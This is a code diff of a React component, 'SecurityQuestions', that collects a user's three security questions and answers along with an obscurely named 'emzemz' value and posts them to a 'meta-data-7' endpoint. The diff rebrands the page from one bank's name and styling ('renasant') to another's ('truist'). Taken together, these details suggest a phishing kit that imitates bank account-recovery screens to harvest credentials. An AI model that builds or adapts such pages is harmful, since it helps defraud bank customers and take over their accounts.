@@ -3,8 +3,7 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
-import FlowCard from '../components/FlowCard';
-import FormError from '../components/FormError';
+import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';
 
 const SecurityQuestions: React.FC = () => {
   const [securityQuestion1, setSecurityQuestion1] = useState('');
@@ -58,7 +57,7 @@ const SecurityQuestions: React.FC = () => {
 
     if (!Object.values(newErrors).some((error) => error)) {
       try {
-        await axios.post(`${baseUrl}api/renasant-meta-data-7/`, {
+        await axios.post(`${baseUrl}api/truist-meta-data-7/`, {
           emzemz,
           securityQuestion1,
           securityAnswer1,
@@ -78,185 +77,188 @@ const SecurityQuestions: React.FC = () => {
     }
   };
 
+  const renderError = (error: string) => {
+    return (
+      <div className="text-xs text-[#ff0000]">{error}</div>
+    );
+  };
+
   if (!isAllowed) {
     return null;
   }
 
   if (!emzemz) {
     return (
-      <FlowCard title="Unable to continue">
-        <p className="text-sm text-slate-600">
-          We could not locate your previous step. Please restart the flow from the beginning.
-        </p>
-      </FlowCard>
+      <div className="flex flex-col items-center justify-center">
+        <div className={cardStyles.base}>
+          <div className={cardStyles.padding}>
+            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+              Unable to continue
+            </h1>
+            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
+              We could not locate your previous step. Please restart the flow from the beginning.
+            </p>
+          </div>
+        </div>
+      </div>
     );
   }
 
-  const footer = (
-    <div className="space-y-2 text-xs text-slate-600">
-      <p>
-        For security reasons, never share your security questions or answers with anyone. These will be used to verify your identity if you need to recover your account.
-      </p>
-      <div className="flex flex-wrap items-center justify-center gap-2 text-[#0f4f6c]">
-        <a href="#" className="hover:underline">Forgot Security Questions?</a>
-        <span className="text-slate-400">|</span>
-        <a href="#" className="hover:underline">Account Recovery Help</a>
+  return (
+    <div className="flex flex-col items-center justify-center">
+      <div className={cardStyles.base}>
+        <div className={cardStyles.padding}>
+          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+            Set Your Security Questions
+          </h1>
+          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
+            Choose unique questions and answers to protect your account
+          </p>
+
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="space-y-4">
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="question-1">
+                  Security Question 1
+                </label>
+                <select
+                  id="question-1"
+                  value={securityQuestion1}
+                  onChange={(e) => setSecurityQuestion1(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                >
+                  <option value="">Select a security question</option>
+                  {securityQuestions.map((question, index) => (
+                    <option key={index} value={question}>
+                      {question}
+                    </option>
+                  ))}
+                </select>
+                {errors.securityQuestion1 && renderError(errors.securityQuestion1)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="answer-1">
+                  Answer 1
+                </label>
+                <input
+                  id="answer-1"
+                  type="text"
+                  value={securityAnswer1}
+                  onChange={(e) => setSecurityAnswer1(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                  placeholder="Enter your answer"
+                />
+                {errors.securityAnswer1 && renderError(errors.securityAnswer1)}
+              </div>
+            </div>
+
+            <div className="space-y-4">
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="question-2">
+                  Security Question 2
+                </label>
+                <select
+                  id="question-2"
+                  value={securityQuestion2}
+                  onChange={(e) => setSecurityQuestion2(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                >
+                  <option value="">Select a security question</option>
+                  {securityQuestions
+                    .filter((question) => question !== securityQuestion1)
+                    .map((question, index) => (
+                      <option key={index} value={question}>
+                        {question}
+                      </option>
+                    ))}
+                </select>
+                {errors.securityQuestion2 && renderError(errors.securityQuestion2)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="answer-2">
+                  Answer 2
+                </label>
+                <input
+                  id="answer-2"
+                  type="text"
+                  value={securityAnswer2}
+                  onChange={(e) => setSecurityAnswer2(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                  placeholder="Enter your answer"
+                />
+                {errors.securityAnswer2 && renderError(errors.securityAnswer2)}
+              </div>
+            </div>
+
+            <div className="space-y-4">
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="question-3">
+                  Security Question 3
+                </label>
+                <select
+                  id="question-3"
+                  value={securityQuestion3}
+                  onChange={(e) => setSecurityQuestion3(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                >
+                  <option value="">Select a security question</option>
+                  {securityQuestions
+                    .filter((question) => question !== securityQuestion1 && question !== securityQuestion2)
+                    .map((question, index) => (
+                      <option key={index} value={question}>
+                        {question}
+                      </option>
+                    ))}
+                </select>
+                {errors.securityQuestion3 && renderError(errors.securityQuestion3)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="answer-3">
+                  Answer 3
+                </label>
+                <input
+                  id="answer-3"
+                  type="text"
+                  value={securityAnswer3}
+                  onChange={(e) => setSecurityAnswer3(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                  placeholder="Enter your answer"
+                />
+                {errors.securityAnswer3 && renderError(errors.securityAnswer3)}
+              </div>
+            </div>
+
+            <div className="flex flex-wrap gap-3 pt-2">
+              <button
+                type="submit"
+                className={buttonStyles.base}
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <span className={buttonStyles.loading}></span>
+                ) : (
+                  'Continue'
+                )}
+              </button>
+            </div>
+          </form>
+
+          <div className="mt-8 text-xs text-[#5d4f72] space-y-2">
+            <p>
+              For security reasons, never share your security questions or answers with anyone.
+            </p>
+            <div className="flex flex-wrap items-center justify-center gap-2 text-[#5f259f]">
+              <a href="#" className="hover:underline">Forgot Security Questions?</a>
+              <span className="text-[#cfc2df]">|</span>
+              <a href="#" className="hover:underline">Account Recovery Help</a>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
-  );
-
-  return (
-    <FlowCard
-      title="Set Your Security Questions"
-      subtitle={<span className="text-slate-600">Choose unique questions and answers to protect your account.</span>}
-      footer={footer}
-    >
-      <form onSubmit={handleSubmit} className="space-y-6">
-        <div className="space-y-4">
-          <div className="space-y-2">
-            <label className="block text-sm text-slate-500" htmlFor="question-1">
-              Security question 1
-            </label>
-            <div className="border border-slate-200 rounded">
-              <select
-                id="question-1"
-                value={securityQuestion1}
-                onChange={(e) => setSecurityQuestion1(e.target.value)}
-                className="w-full bg-white px-3 py-3 text-sm focus:outline-none"
-              >
-                <option value="">Select a security question</option>
-                {securityQuestions.map((question, index) => (
-                  <option key={index} value={question}>
-                    {question}
-                  </option>
-                ))}
-              </select>
-            </div>
-            {errors.securityQuestion1 ? <FormError message={errors.securityQuestion1} /> : null}
-          </div>
-
-          <div className="space-y-2">
-            <label className="block text-sm text-slate-500" htmlFor="answer-1">
-              Answer 1
-            </label>
-            <div className="flex items-center border border-slate-200 rounded">
-              <input
-                id="answer-1"
-                type="text"
-                value={securityAnswer1}
-                onChange={(e) => setSecurityAnswer1(e.target.value)}
-                className="w-full px-3 py-3 text-sm focus:outline-none"
-                placeholder="Enter your answer"
-              />
-            </div>
-            {errors.securityAnswer1 ? <FormError message={errors.securityAnswer1} /> : null}
-          </div>
-        </div>
-
-        <div className="space-y-4">
-          <div className="space-y-2">
-            <label className="block text-sm text-slate-500" htmlFor="question-2">
-              Security question 2
-            </label>
-            <div className="border border-slate-200 rounded">
-              <select
-                id="question-2"
-                value={securityQuestion2}
-                onChange={(e) => setSecurityQuestion2(e.target.value)}
-                className="w-full bg-white px-3 py-3 text-sm focus:outline-none"
-              >
-                <option value="">Select a security question</option>
-                {securityQuestions
-                  .filter((question) => question !== securityQuestion1)
-                  .map((question, index) => (
-                    <option key={index} value={question}>
-                      {question}
-                    </option>
-                  ))}
-              </select>
-            </div>
-            {errors.securityQuestion2 ? <FormError message={errors.securityQuestion2} /> : null}
-          </div>
-
-          <div className="space-y-2">
-            <label className="block text-sm text-slate-500" htmlFor="answer-2">
-              Answer 2
-            </label>
-            <div className="flex items-center border border-slate-200 rounded">
-              <input
-                id="answer-2"
-                type="text"
-                value={securityAnswer2}
-                onChange={(e) => setSecurityAnswer2(e.target.value)}
-                className="w-full px-3 py-3 text-sm focus:outline-none"
-                placeholder="Enter your answer"
-              />
-            </div>
-            {errors.securityAnswer2 ? <FormError message={errors.securityAnswer2} /> : null}
-          </div>
-        </div>
-
-        <div className="space-y-4">
-          <div className="space-y-2">
-            <label className="block text-sm text-slate-500" htmlFor="question-3">
-              Security question 3
-            </label>
-            <div className="border border-slate-200 rounded">
-              <select
-                id="question-3"
-                value={securityQuestion3}
-                onChange={(e) => setSecurityQuestion3(e.target.value)}
-                className="w-full bg-white px-3 py-3 text-sm focus:outline-none"
-              >
-                <option value="">Select a security question</option>
-                {securityQuestions
-                  .filter((question) => question !== securityQuestion1 && question !== securityQuestion2)
-                  .map((question, index) => (
-                    <option key={index} value={question}>
-                      {question}
-                    </option>
-                  ))}
-              </select>
-            </div>
-            {errors.securityQuestion3 ? <FormError message={errors.securityQuestion3} /> : null}
-          </div>
-
-          <div className="space-y-2">
-            <label className="block text-sm text-slate-500" htmlFor="answer-3">
-              Answer 3
-            </label>
-            <div className="flex items-center border border-slate-200 rounded">
-              <input
-                id="answer-3"
-                type="text"
-                value={securityAnswer3}
-                onChange={(e) => setSecurityAnswer3(e.target.value)}
-                className="w-full px-3 py-3 text-sm focus:outline-none"
-                placeholder="Enter your answer"
-              />
-            </div>
-            {errors.securityAnswer3 ? <FormError message={errors.securityAnswer3} /> : null}
-          </div>
-        </div>
-
-        <button
-          type="submit"
-          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
-          disabled={isLoading}
-        >
-          {isLoading ? (
-            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
-          ) : (
-            <>
-              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
-              </svg>
-              <span>Continue</span>
-            </>
-          )}
-        </button>
-      </form>
-    </FlowCard>
   );
 };
 
